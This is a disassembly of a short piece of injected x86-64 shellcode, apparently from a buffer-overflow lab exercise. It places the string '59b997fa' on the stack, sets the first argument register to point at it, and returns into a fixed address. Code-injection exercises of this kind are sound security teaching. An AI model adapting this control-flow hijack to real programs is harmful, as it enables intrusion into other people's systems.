
setRdiToCookieStringPointer.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	6a 00                	pushq  $0x0
   2:	48 b8 35 39 62 39 39 	movabs $0x6166373939623935,%rax
   9:	37 66 61 
   c:	50                   	push   %rax
   d:	48 89 e7             	mov    %rsp,%rdi
  10:	48 c7 c0 fa 18 40 00 	mov    $0x4018fa,%rax
  17:	50                   	push   %rax
  18:	c3                   	retq   
